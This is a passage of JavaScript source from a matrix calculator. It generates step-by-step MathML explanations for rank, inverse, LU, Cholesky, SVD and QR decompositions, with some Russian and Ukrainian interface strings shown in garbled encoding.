    var title = i18n.methodOfMontanteDetails.determinantDetails.start.replace(/\$\{someDetails3\}/g, Expression.getSomeDetails("someDetails3")).replace(/\$\{a_\(i,j\)\=\(a_\(r,c\)\*a_\(i,j\)\-a_\(i,c\)\*a_\(r,j\)\)\/p\}/g, "<math>" + Expression.p("a_(i,j)=(a_(r,c)*a_(i,j)-a_(i,c)*a_(r,j))/p") + "</math>").replace(/\$\{a_\(r,c\)\}/g, "<math>" + Expression.p("a_(r,c)") + "</math>").replace(/\$\{r\}/g, "<math>" + "<mi>r</mi>" + "</math>").replace(/\$\{c\}/g, "<math>" + "<mi>c</mi>" + "</math>").replace(/\$\{p\}/g, "<math>" + "<mi>p</mi>" + "</math>");
    return getDeterminantDetails(printOptions, matrix, Matrix.GaussMontante, title, i18n.methodOfMontanteDetails.determinantDetails.header);
  }
});

var getRankDetails = function (printOptions, matrix, method, title) {
  var html = "";
  html += "<div>";
  html += "<math>";
  html += new Expression.Rank(new Expression.Matrix(matrix)).toMathML(printOptions) + "<mo>=</mo><mi>?</mi>";
  html += "</math>";
  html += "</div>";

  if (title != undefined) {
    //TODO: remove
    html += "<p>" + title + "</p>";
  }

  html += Expression.rowReductionGaussJordanMontante(matrix, method, "", printOptions, function (tmp) {
    var rowEchelonMatrix = tmp.matrix;
    var html = "";
    html += "<div>";
    html += "<math>";
    html += new Expression.Rank(new Expression.Matrix(matrix)).toMathML(printOptions);
    html += "<mo>=</mo>";
    html += new Expression.Rank(new Expression.Matrix(rowEchelonMatrix)).toMathML(printOptions);
    html += "<mo>=</mo>";
    html += Expression.Integer.fromNumber(rowEchelonMatrix.rank()).toMathML();
    html += "</math>";
    html += "</div>";
    return html;
  }); //?

  return html;
};

Expression.Details.add({
  type: "rank-Gauss",
  i18n: function () {
    return i18n.det.methodOfGauss;
  },
  minRows: 2,
  callback: function (printOptions, matrix) {
    return getRankDetails(printOptions, matrix, Matrix.Gauss, i18n.rankDetails.start);
  }
});
Expression.Details.add({
  type: "rank-Montante",
  i18n: function () {
    return i18n.det.methodOfMontante;
  },
  minRows: 2,
  priority: 1,
  //TODO: ?
  callback: function (printOptions, matrix) {
    //TODO:
    //i18n.methodOfMontanteDetails.rankDetails.start
    return getRankDetails(printOptions, matrix, Matrix.GaussMontante, undefined);
  }
}); // TODO:
// http://www.mathsisfun.com/algebra/matrix-inverse-row-operations-gauss-jordan.html
// i18n.inverseDetails.rowSwapNegate = "- Trocamos o linha {s} e o linha {c}:, ...";

var getInverseDetails = function (printOptions, matrix, method, title) {
  var html = "";
  html += "<div>";
  html += "<math>";
  html += new Expression.Exponentiation(new Expression.Matrix(matrix), Expression.ONE.negate()).toMathML(printOptions) + "<mo>=</mo><mi>?</mi>";
  html += "</math>";
  html += "</div>";

  if (title != undefined) {
    //TODO: remove
    html += "<p>" + title + "</p>";
  } //TODO: merge (?)


  var augmented = matrix.augment(Matrix.I(matrix.rows()));
  html += Expression.rowReductionGaussJordanMontante(augmented, method, "inverse", Object.assign({}, printOptions, {
    columnlines: -matrix.cols()
  }), function (tmp) {
    var augmentedResult = tmp.matrix;
    var hasZeroElement = false;

    for (var i = 0; i < augmentedResult.rows(); i += 1) {
      if (augmentedResult.e(i, i).equals(Expression.ZERO)) {
        hasZeroElement = true;
      }
    }

    var html = "";

    if (!hasZeroElement) {
      var result2 = Matrix.Zero(matrix.rows(), matrix.rows()).map(function (element, i, j) {
        // splitting to get the second half
        return augmentedResult.e(i, j + augmentedResult.rows());
      });
      var result = result2.map(function (element, i, j) {
        return element.divide(augmentedResult.e(i, i));
      });
      html += "<div>";
      html += "<math>";
      html += new Expression.Exponentiation(new Expression.Matrix(matrix), Expression.ONE.negate()).toMathML(printOptions);

      if (method === Matrix.GaussMontante) {
        var c = augmentedResult.e(0, 0); //!

        html += "<mo>=</mo>";
        html += new Expression.Multiplication(new Expression.Division(Expression.ONE, c), new Expression.Matrix(result2)).toMathML(printOptions);
      }

      html += "<mo>=</mo>";
      html += new Expression.Matrix(result).toMathML(printOptions);
      html += "</math>";
      html += "</div>";
    } else {//TODO: ?
    }

    return html;
  });
  return html;
};

Expression.Details.add({
  type: "inverse-Gauss",
  i18n: function () {
    return i18n.inverse.methodOfGaussJordan;
  },
  minRows: 3,
  callback: function (printOptions, matrix) {
    return getInverseDetails(printOptions, matrix, Matrix.GaussJordan, i18n.inverseDetails.start);
  }
});
Expression.Details.add({
  type: "inverse-Montante",
  i18n: function () {
    return i18n.det.methodOfMontante;
  },
  minRows: 3,
  priority: 1,
  //TODO: ?
  callback: function (printOptions, matrix) {
    // TODO: i18n.methodOfMontanteDetails.inverseDetails.start
    return getInverseDetails(printOptions, matrix, Matrix.GaussMontante, undefined);
  }
});
Expression.Details.add({
  type: "LU-decomposition",
  i18n: function () {
    return i18n.index.LUDecomposition;
  },
  minRows: 2,
  callback: function (printOptions, matrix) {
    var palu = Expression.LUDecomposition(matrix);
    var html = "";
    html += "<div class=\"math-block\">";
    html += "<math>";
    html += Expression.p(palu.swapFlag ? "P*A=L*U" : "A=L*U", palu, printOptions);
    html += "</math>";
    html += "</div>";
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-LU-decomposition',
      matrix: matrix.toString(),
      second: undefined
    }]);
    return html + detailsHTML;
  }
});
Expression.Details.add({
  type: "steps-to-find-LU-decomposition",
  i18n: function () {
    return i18n.index.LUDecomposition;
  },
  minRows: 2,
  callback: function (printOptions, matrix) {
    var palu = Expression.LUDecomposition(matrix);
    var html = ""; //TODO: fix

    html += Expression.rowReductionGaussJordanMontante(matrix, Matrix.Gauss, "LU-decomposition", Object.assign({}, printOptions, {
      isLUDecomposition: true
    }), function (result) {
      return "";
    });
    html += "<div class=\"math-block\">"; //TODO: output P

    html += "<math>";
    html += Expression.p("L=M", {
      M: palu.L
    }, Object.assign({}, printOptions, {
      isLUDecomposition2: true
    }));
    html += "</math>";
    html += "<span>, </span>";
    html += "<math>";
    html += Expression.p("U=M", {
      U: new Expression.Symbol("U"),
      M: palu.U
    }, printOptions); // U - is not an IdentityMatrix

    html += "</math>";
    html += "</div>";
    return html;
  }
});
Expression.Details.add({
  type: "Gaussian-elimination",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var c = 0;
    var html = "";
    Matrix.toRowEchelonWithCallback(matrix, Matrix.Gauss, "row-reduction", null, function (result) {
      c += 1;
      var condition = result.condition;
      var resultMatrix = result.matrix;

      if (!condition.isTrue()) {
        html += "<li>";
        html += "<div class=\"like-table\">";
      }

      html += "<math>";
      html += new Expression.Matrix(matrix).toMathML(printOptions);
      html += "<mo>~</mo>";
      html += new Expression.Matrix(resultMatrix).toMathML(printOptions);
      html += "</math>";

      if (!condition.isTrue()) {
        html += "<math>";
        html += "<mrow><mo>(</mo>";
        html += condition.toMathML(printOptions);
        html += "<mo>)</mo></mrow>";
        html += "</math>";
        html += "</div>";
        html += "</li>";
      }
    });

    if (c > 1) {
      html = "<ul class=\"list-unstyled\">" + html + "</ul>";
    }

    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-row-echelon-matrix',
      matrix: matrix.toString(),
      second: undefined
    }]);
    return html + detailsHTML;
  }
});
Expression.Details.add({
  type: "steps-to-find-row-echelon-matrix",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var html = Expression.rowReductionGaussJordanMontante(matrix, Matrix.Gauss, "row-reduction", printOptions, function (tmp) {
      //var result = tmp.matrix;
      if (tmp.condition.isTrue() && tmp.matrix.eql(matrix)) {
        return i18n.systems.theMatrixIsInRowEchelonForm;
      }

      return "";
    });
    return html;
  }
});
})();
(function () {
"use strict";
/*global i18n, Expression, Matrix, NonSimplifiedExpression*/
 //TODO:

 //TODO:

Expression.Details.add({
  type: "Cholesky-decomposition",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-Cholesky-decomposition',
      matrix: matrix.toString(),
      second: undefined
    }]);

    try {
      var tmp = Expression.CholeskyDecomposition(matrix);
    } catch (error) {
      if (error.message === "NonPositiveDefiniteMatrix") {
        return "<p>" + i18n.CholeskyDecomposition.theMatrixIsNotPositiveDefinite + "</p>" + detailsHTML;
      }

      throw error;
    }

    var L = tmp.L;
    var A = matrix;
    var html = "";
    html += "<div class=\"math-block\">";
    html += "<math>" + Expression.p("A=L*T", {
      A: new Expression.Matrix(A),
      L: new Expression.Matrix(L),
      T: new Expression.Matrix(L.transpose().map(function (e) { return e.complexConjugate(); }))
    }, printOptions) + "</math>";
    html += "</div>";
    return html + detailsHTML;
  }
});
Expression.Details.add({
  type: "svd",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-SVD',
      matrix: matrix.toString(),
      second: undefined
    }]);
    var tmp = Expression.SVD(matrix);
    var A = matrix;
    var isReal = Expression.isRealMatrix(A);
    var html = "";
    html += "<div>";
    html += "<math>";
    html += Expression.p(isReal ? "A=U*S*V^T" : "A=U*S*V^{*}", {
      A: new Expression.Matrix(A),
      U: new Expression.Matrix(tmp.U),
      S: new Expression.Matrix(tmp.Sigma),
      V: new Expression.Matrix(tmp.Vstar.conjugateTranspose())
    }, printOptions);
    html += "</math>";
    html += "</div>";
    html += detailsHTML;
    return html;
  }
});
Expression.Details.add({
  type: "steps-to-find-SVD",
  //i18n: function () {
  //return i18n.index.SingularValueDecomposition;
  //},
  i18n: null,
  minRows: 2,
  callback: function (printOptions, matrix) {
    //TODO: !?
    var matrixSymbols = 'A:A U:U Î£:S V:V v_i:v_0 Ïƒ_i:Ïƒ_0 u_i:u_0'.split(' '); //runWithConsoleInfoToHTMLConversion(() => Expression.SVD(matrix));

    var html = ''; //TODO: use ^T - for real, ^{*} - for complex

    var object = {};

    for (var iterators = matrixSymbols[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
      var tmp = s.split(':');
      object[tmp[1]] = new Expression.MatrixSymbol(tmp[0]);
    }

    var replaceSomeSymbols = function (string) {
      for (var iterators = matrixSymbols[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
        var tmp = s.split(':');
        string = string.replaceAll(tmp[0], tmp[1]);
      }

      return string;
    };

    for (var key in i18n.SVD) {
      if (Object.prototype.hasOwnProperty.call(i18n.SVD, key)) {
        i18n.SVD[key] = '<p>' + i18n.SVD[key].replace(/\$\{([^\}]+)\}/g, function (p, e) { return '<math>' + Expression.p(replaceSomeSymbols(e), object, {}) + '</math>'; }) + '</p>';
      }
    }

    var tmp = Expression.SVD(matrix);
    var U = tmp.U;
    var Sigma = tmp.Sigma;
    var V = tmp.Vstar.conjugateTranspose(); //TODO: !?

    html += i18n.SVD.definition;
    html += i18n.SVD.howToFind; //TODO: !?

    html += '<p>' + '<math>' + Expression.p('A=M', {
      A: new Expression.MatrixSymbol('A'),
      M: new Expression.Matrix(matrix)
    }, printOptions) + '</math>' + '</p>';
    html += '<ol>';
    html += '<li>';
    html += i18n.SVD.findEigenvaluesAndEigenvectorsOfATA;
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'eigenvectors',
      matrix: matrix.conjugateTranspose().multiply(matrix).toString(),
      second: undefined
    }]);
    html += detailsHTML;
    html += i18n.SVD.orthonormalizedEigenvectors;
    html += '<ul class="list-unstyled">'; // v_1 = ..., v_2 = ... - column vectors

    for (var i = 0; i < V.cols(); i += 1) {
      html += '<li>';
      html += '<math>' + Expression.p('v=x', {
        v: new Expression.MatrixSymbol('v_i'.replaceAll('i', i + 1)),
        x: new Expression.Matrix(V.col(i))
      }, printOptions) + '</math>';
      html += ', ';

      if (i < Sigma.cols() && i < Sigma.rows()) {
        html += '<math>' + Expression.p('s=x=y', {
          s: new Expression.Symbol('Ïƒ_i'.replaceAll('i', i + 1)),
          x: new Expression.SquareRoot(Sigma.e(i, i)._pow(2)),
          y: Sigma.e(i, i)
        }, printOptions) + '</math>';
      }

      html += '</li>';
    }

    html += '</ul>'; //TODO: property that distict eigenvalues have orthogonalized eigenvalues for symmetric matrices is used (link)

    html += '</li>';
    html += '<li>';
    html += i18n.SVD.constructSigmaFromSquareRootsOfTheEigenvaluesCorrespondingToEigenvectors;
    html += '<p>';
    html += '<math>' + Expression.p('S=M', {
      S: new Expression.MatrixSymbol('Î£'),
      M: new Expression.Matrix(Sigma)
    }, printOptions) + '</math>'; //TODO: [sqrt(lambda_i)]

    html += '</p>';
    html += '</li>';
    html += '<li>';
    html += i18n.SVD.findColumnVectorsOfU;
    html += i18n.SVD.howToFindUi; //TODO: link to better explanation (or just use the "column" vectors to show better)

    html += '<ul class="list-unstyled">';
    var i = 0;

    while (i < Sigma.rows() && i < Sigma.cols() && !Sigma.e(i, i).equals(Expression.ZERO)) {
      html += '<li>';
      html += '<math>' + Expression.p('u=x', {
        u: new Expression.MatrixSymbol('u_i'.replaceAll('i', i + 1)),
        x: new Expression.Matrix(U.col(i))
      }, printOptions) + '</math>';
      html += '</li>';
      i += 1;
    }

    html += '</ul>';

    if (i < matrix.rows()) {
      html += i18n.SVD.weNeedToFindFewMoreVectorsToBuildMatrixU; //?

      html += i18n.SVD.weFindEigenvectorsOfAATForZeroEigenvalue; //TODO: details

      html += i18n.SVD.orthonormalizedEigenvectors; // u_1 = ..., u_2 = ... - column vectors

      html += '<ul class="list-unstyled">';

      while (i < U.cols()) {
        html += '<li>';
        html += '<math>' + Expression.p('u=x', {
          u: new Expression.MatrixSymbol('u_i'.replaceAll('i', i + 1)),
          x: new Expression.Matrix(U.col(i))
        }, printOptions) + '</math>';
        html += '</li>';
        i += 1;
      }

      html += '</ul>';
    }

    html += i18n.SVD.itCanBeShownThatTheVectorsOfUAreOrthonormalized; //?

    html += '</li>';
    html += '</ol>';
    html += '<p>';
    html += '<math>';
    html += new Expression.Comma(new Expression.Comma(new Expression.Equality(new Expression.MatrixSymbol('U'), new Expression.Matrix(U)), new Expression.Equality(new Expression.MatrixSymbol('Î£'), new Expression.Matrix(Sigma))), new Expression.Equality(new Expression.MatrixSymbol('V'), new Expression.Matrix(V))).toMathML(printOptions);
    html += '</math>';
    html += '</p>';
    return html;
  }
});
Expression.Details.add({
  type: "steps-to-find-QR-decomposition",
  i18n: null,
  minRows: 2,
  callback: function (printOptions, matrix) {
    var vectors = function (A, symbol) {
      var html = '';
      html += '<math>';

      for (var i = 0; i < A.cols(); i += 1) {
        var v = A.col(i);
        html += '<mrow>';
        html += new Expression.MatrixSymbol(symbol + '_' + (i + 1)).toMathML() + '<mo>=</mo>' + new Expression.Matrix(v).toMathML(printOptions);
        html += '</mrow>';

        if (i !== A.cols() - 1) {
          html += '<mo>,</mo>';
        }
      }

      html += '</math>';
      return html;
    }; //!!!
    //TODO:


    var i18n = {
      QRDecomposition: {
        definition: '<a href="https://en.wikipedia.org/wiki/QR_decomposition">QR decomposition</a> is a decomposition `A = QR`, where `Q` is an <a href="https://en.wikipedia.org/wiki/Orthogonal_matrix">orthogonal matrix</a> and `R` is an upper triangular matrix.',
        columnVectorsOfTheMatrixA: 'The column vectors of the matrix `A`:',
        GramSchmidtOrthogonalizationProduces: '<a href="https://en.wikipedia.org/wiki/Gramâ€“Schmidt_process">Gramâ€“Schmidt orthogonalization</a> of this vectors produces the next vectors:',
        afterNormalizationWeHave: 'After <a href="https://en.wikipedia.org/wiki/Norm_(mathematics)">normalization</a> we have:',
        buildTheMatrixQFromThisVectors: 'Build the matrix `Q` from this vectors:',
        howToFindR: 'The matrix `Q` is orthogonal (`Q^{*}*Q=I`), so by multiplying both sides of the equation `A = QR` by `Q^{*}` we get `Q^{*}*A=R`.',
        findR: 'Find `R=Q^{*}*A`:'
      }
    };

    if (document.documentElement.lang === 'ru') {
      i18n = {
        QRDecomposition: {
          definition: '<a href="https://ru.wikipedia.org/wiki/QR-Ñ€Ð°Ð·Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ">QR Ñ€Ð°Ð·Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ</a> ÑÑ‚Ð¾ Ñ€Ð°Ð·Ð»Ð¾Ð¶ÐµÐ½Ð¸Ðµ Ð²Ð¸Ð´Ð° `A = QR`, Ð³Ð´Ðµ `Q` - <a href="https://ru.wikipedia.org/wiki/ÐžÑ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð°Ñ_Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ð°">Ð¾Ñ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð°Ñ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ð°</a> Ð¸ `R` - Ð²ÐµÑ€Ñ…Ð½Ðµ-Ñ‚Ñ€ÐµÑƒÐ³Ð¾Ð»ÑŒÐ½Ð°Ñ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ð°.',
          columnVectorsOfTheMatrixA: 'Ð’ÐµÐºÑ‚Ð¾Ñ€Ñ‹-ÑÑ‚Ð¾Ð»Ð±Ñ†Ñ‹ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ‹ `A`:',
          GramSchmidtOrthogonalizationProduces: '<a href="https://ru.wikipedia.org/wiki/ÐŸÑ€Ð¾Ñ†ÐµÑÑ_Ð“Ñ€Ð°Ð¼Ð°_â€•_Ð¨Ð¼Ð¸Ð´Ñ‚Ð°">ÐžÑ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ñ Ð“Ñ€Ð°Ð¼Ð° â€• Ð¨Ð¼Ð¸Ð´Ñ‚Ð°</a> Ð´Ð°Ð½Ð½Ñ‹Ñ… Ð²ÐµÐºÑ‚Ð¾Ñ€Ð¾Ð² Ð´Ð°Ñ‘Ñ‚ Ð²ÐµÐºÑ‚Ð¾Ñ€Ñ‹:',
          afterNormalizationWeHave: 'ÐŸÐ¾ÑÐ»Ðµ <a href="https://ru.wikipedia.org/wiki/ÐÐ¾Ñ€Ð¼Ð°_(Ð¼Ð°Ñ‚ÐµÐ¼Ð°Ñ‚Ð¸ÐºÐ°)#ÐÐ¾Ñ€Ð¼Ð°_Ð²ÐµÐºÑ‚Ð¾Ñ€Ð°">Ð½Ð¾Ñ€Ð¼Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ð¸</a> Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ð¼:',
          buildTheMatrixQFromThisVectors: 'ÐŸÐ¾ÑÑ‚Ñ€Ð¾Ð¸Ð¼ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñƒ `Q` Ð¸Ð· ÑÑ‚Ð¸Ñ… Ð²ÐµÐºÑ‚Ð¾Ñ€Ð¾Ð²:',
          howToFindR: 'ÐœÐ°Ñ‚Ñ€Ð¸Ñ†Ð° `Q` ÑÐ²Ð»ÑÐµÑ‚ÑÑ Ð¾Ñ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð¾Ð¹ (`Q^{*}*Q=I`), Ð¿Ð¾ÑÑ‚Ð¾Ð¼Ñƒ Ð´Ð¾Ð¼Ð½Ð¾Ð¶Ð¸Ð² Ð¾Ð±Ðµ Ñ‡Ð°ÑÑ‚Ð¸ ÑƒÑ€Ð°Ð²Ð½ÐµÐ½Ð¸Ñ `A = QR` Ð½Ð° `Q^{*}` Ð¼Ñ‹ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ð¼ `Q^{*}*A=R`.',
          findR: 'ÐÐ°Ð¹Ð´Ñ‘Ð¼ `R=Q^{*}*A`:'
        }
      };
    }

    if (document.documentElement.lang === 'uk') {
      i18n = {
        QRDecomposition: {
          definition: '<a href="https://uk.wikipedia.org/wiki/QR-Ñ€Ð¾Ð·ÐºÐ»Ð°Ð´_Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ–">QR Ñ€Ð¾Ð·ÐºÐ»Ð°Ð´Ð°Ð½Ð½Ñ</a> Ñ†Ðµ Ñ€Ð¾Ð·ÐºÐ»Ð°Ð´Ð°Ð½Ð½Ñ Ð²Ð¸Ð´Ñƒ `A = QR`, Ð´Ðµ `Q` - <a href="https://uk.wikipedia.org/wiki/ÐžÑ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð°_Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ">Ð¾Ñ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð° Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ</a> Ñ– `R` - Ð²ÐµÑ€Ñ…Ð½ÑŒÐ¾Ñ‚Ñ€Ð¸ÐºÑƒÑ‚Ð½Ð° Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ.',
          columnVectorsOfTheMatrixA: 'Ð’ÐµÐºÑ‚Ð¾Ñ€Ð¸-ÑÑ‚Ð¾Ð²Ð¿Ñ†Ñ– Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†Ñ– `A`:',
          GramSchmidtOrthogonalizationProduces: '<a href="https://uk.wikipedia.org/wiki/ÐŸÑ€Ð¾Ñ†ÐµÑ_Ð“Ñ€Ð°Ð¼Ð°_â€”_Ð¨Ð¼Ñ–Ð´Ñ‚Ð°">ÐžÑ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»Ñ–Ð·Ð°Ñ†Ñ–Ñ Ð“Ñ€Ð°Ð¼Ð° â€• Ð¨Ð¼Ñ–Ð´Ñ‚Ð°</a> Ð´Ð°Ð½Ð¸Ñ… Ð²ÐµÐºÑ‚Ð¾Ñ€Ñ–Ð² Ð´Ð°Ñ” Ð²ÐµÐºÑ‚Ð¾Ñ€Ð¸:',
          afterNormalizationWeHave: 'ÐŸÑ–ÑÐ»Ñ <a href="https://uk.wikipedia.org/wiki/ÐÐ¾Ñ€Ð¼Ð°_(Ð¼Ð°Ñ‚ÐµÐ¼Ð°Ñ‚Ð¸ÐºÐ°)#Ð•Ð²ÐºÐ»Ñ–Ð´Ð¾Ð²Ð°_Ð½Ð¾Ñ€Ð¼Ð°">Ð½Ð¾Ñ€Ð¼Ð°Ð»Ñ–Ð·Ð°Ñ†Ñ–Ñ—</a> Ð¾Ñ‚Ñ€Ð¸Ð¼Ð°Ñ”Ð¼Ð¾:',
          buildTheMatrixQFromThisVectors: 'ÐŸÐ¾Ð±ÑƒÐ´ÑƒÑ”Ð¼Ð¾ Ð¼Ð°Ñ‚Ñ€Ð¸Ñ†ÑŽ `Q` Ñ–Ð· Ñ†Ð¸Ñ… Ð²ÐµÐºÑ‚Ð¾Ñ€Ñ–Ð²:',
          howToFindR: 'ÐœÐ°Ñ‚Ñ€Ð¸Ñ†Ñ `Q` Ñ” Ð¾Ñ€Ñ‚Ð¾Ð³Ð¾Ð½Ð°Ð»ÑŒÐ½Ð¾ÑŽ (`Q^{*}*Q=I`), Ñ‚Ð¾Ð¼Ñƒ Ð´Ð¾Ð¼Ð½Ð¾Ð¶Ð¸Ð²ÑˆÐ¸ Ð¾Ð±Ð¸Ð´Ð²Ñ– Ñ‡Ð°ÑÑ‚Ð¸Ð½Ð¸ Ñ€Ñ–Ð²Ð½ÑÐ½Ð½Ñ `A = QR` Ð½Ð° `Q^{*}` Ð¼Ð¸ Ð¾Ñ‚Ñ€Ð¸Ð¼Ð°Ñ”Ð¼Ð¾ `Q^{*}*A=R`.',
          findR: 'Ð—Ð½Ð°Ð¹Ð´ÐµÐ¼Ð¾ `R=Q^{*}*A`:'
        }
      };
    }

    var html = '';
    html += '<p>' + i18n.QRDecomposition.definition.replaceAll('`A = QR`', '<math>' + Expression.p('A = QR') + '</math>').replaceAll('`Q`', '<math>' + Expression.p('Q') + '</math>').replaceAll('`R`', '<math>' + Expression.p('R') + '</math>') + '</p>';
    var A = matrix;
    html += '<div>';
    html += '<math>' + Expression.p('A=M', {
      M: new Expression.Matrix(A)
    }, printOptions) + '</math>';
    html += '</div>';
    html += '<p>' + i18n.QRDecomposition.columnVectorsOfTheMatrixA.replaceAll('`A`', '<math>' + Expression.p('A') + '</math>') + '</p>';
    var columnVectors = new Array(A.cols());

    for (var i = 0; i < A.cols(); i += 1) {
      var v = A.col(i);
      columnVectors[i] = v;
    }

    html += vectors(A, 'v');
    html += '<p>' + i18n.QRDecomposition.GramSchmidtOrthogonalizationProduces + '</p>';
    var U = GramSchmidtOrthogonalization(columnVectors).filter(function (vector) { return !vector.eql(Matrix.Vector.Zero(vector.dimensions())); });
    html += '<details>';
    html += '<div class="indented">';
    html += 'Gram-Schmidt orthogonalization can be done by using row-reduction for matrix [A^T*(A^T)^{*} | A^T], it can be shown that the expansion side will contain resulting vectors.';
    var X = A.transpose().multiply(A.transpose().conjugateTranspose());
    var E = X.augment(A.transpose());
    var Y = E.toRowEchelon(Matrix.Gauss, "row-reduction").matrix;
    html += '<div>';
    html += '<math>';
    html += Expression.p('A^T*(A^T)^{*}=X', {
      X: new Expression.Matrix(X)
    }, printOptions);
    html += '</math>';
    html += '</div>';
    html += '<div>';
    html += '<math>';
    html += new Expression.Matrix(E).toMathML(Object.assign({}, printOptions, {
      columnlines: -A.rows()
    }));
    html += '<mo>~</mo>';
    html += new Expression.Matrix(Y).toMathML(Object.assign({}, printOptions, {
      columnlines: -A.rows()
    }));
    html += '</math>';
    html += '</div>';
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-row-echelon-matrix',
      matrix: E.toString(),
      second: undefined
    }]);
    html += detailsHTML;
    html += '</div>';
    html += '</details>';
    html += vectors(Matrix.fromVectors(U), 'e');
    html += '<p>' + i18n.QRDecomposition.afterNormalizationWeHave + '</p>';
    var Q = Matrix.fromVectors(U.map(function (vector) { return vector.toUnitVector(); }));
    html += vectors(Q, 'q');
    html += '<p>' + i18n.QRDecomposition.buildTheMatrixQFromThisVectors.replaceAll('`Q`', '<math>' + Expression.p('Q') + '</math>') + '</p>';
    html += '<div>';
    html += '<math>' + Expression.p('Q=M', {
      M: new Expression.Matrix(Q)
    }, printOptions) + '</math>';
    html += '</div>';
    html += '<p>' + i18n.QRDecomposition.howToFindR.replace(/`[^`]+`/g, function (p) { return '<math>' + Expression.p(p.slice(1, -1)) + '</math>'; }) + '</p>';
    html += '<p>' + i18n.QRDecomposition.findR.replaceAll('`R=Q^{*}*A`', '<math>' + Expression.p('R=Q^{*}*A') + '</math>') + '</p>';
    html += '<div>';
    var R = Q.conjugateTranspose().multiply(A);
    html += '<math>' + Expression.p('R=M', {
      M: new Expression.Matrix(R)
    }, printOptions) + '</math>';
    html += '</div>';
    return html;
  }
}); //TODO: remove:
// backward compatibility: 

Expression.Details.add({
  type: "SVD-decomposition",
  minRows: 2,
  callback: function (printOptions, matrix) {
    return Expression.Details.getCallback("svd")(printOptions, matrix);
  }
});
Expression.Details.add({
  type: "QR-decomposition",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var detailsHTML = RPN.createDetailsSummary(printOptions.idPrefix, [{
      type: 'steps-to-find-QR-decomposition',
      matrix: matrix.toString(),
      second: undefined
    }]);
    var tmp = Expression.QRDecomposition(matrix);
    var A = matrix;
    var html = "";
    html += "<div>";
    html += "<math>";
    html += Expression.p("A=Q*R", {
      A: new Expression.Matrix(A),
      Q: new Expression.Matrix(tmp.Q),
      R: new Expression.Matrix(tmp.R)
    }, printOptions);
    html += "</math>";
    html += "</div>";
    html += detailsHTML;
    return html;
  }
});
Expression.Details.add({
  type: "steps-to-find-Cholesky-decomposition",
  i18n: function () {
    return i18n.index.CholeskyDecomposition;
  },
  minRows: 2,
  callback: function (printOptions, matrix) {
    //TODO: better details when a lot of zeros - ?
    var A = matrix; // check if A is square

    if (!A.isSquare()) {
      throw new RangeError("NonSquareMatrixException");
    }

    var n = A.rows(); // check if A from R

    var isReal = Expression.isRealMatrix(A);

    var onSymmetricChecking = function (symmetric) {
      var html = "";
      html += "<div>";
      html += "<math>";
      html += Expression.p("A=X", {
        X: new Expression.Matrix(A)
      }, printOptions);
      html += "</math>";
      html += "</div>";
      html += "<div>";
      html += "<math>"; //TODO: highlight e(i, j), e(j, i) - ?

      html += (isReal ? Expression.p("A=A^T") : Expression.p("A=A^{*}")).replace(/<mo>=<\/mo>/g, symmetric ? '<mo>=</mo>' : '<mo>&ne;</mo>');
      html += "</math>";
      html += "<span>";
      html += " - ";

      if (isReal) {
        html += symmetric ? i18n.CholeskyDecomposition.theMatrixIsSymmetric : i18n.CholeskyDecomposition.theMatrixIsNotSymmetric;
      } else {
        html += symmetric ? i18n.CholeskyDecomposition.theMatrixIsHermitian : i18n.CholeskyDecomposition.theMatrixIsNotHermitian;
      }

      html += "</span>";
      html += "</div>";
      return html;
    }; // check if A is symmetric


    for (var i = 0; i < n; i += 1) {
      for (var j = i; j < n; j += 1) {
        if (!A.e(i, j).equals(A.e(j, i).complexConjugate())) {
          // throw new RangeError("NonSymmetricMatrixException");
          return onSymmetricChecking(false);
        }
      }
    }

    var html = ""; //var tmp = Expression.CholeskyDecomposition(matrix);
    //var L = tmp.L.matrix;
    // The matrix is symmetric

    html += onSymmetricChecking(true); // 1.  A = L * L^T

    var nsL = Matrix.Zero(n, n).map(function (e, i, j) {
      return i >= j ? new Expression.Symbol("l_(" + (i + 1).toString() + "," + (j + 1).toString() + ")") : Expression.ZERO;
    });
    html += "<div>";
    html += i18n.CholeskyDecomposition.definition.replaceAll('${A=L*L^T}', '<math>' + (isReal ? Expression.p("A=L*L^T") : Expression.p("A=L*L^{*}")) + '</math>').replaceAll('${L}', '<math>' + Expression.p('L') + '</math>');
    html += " ";
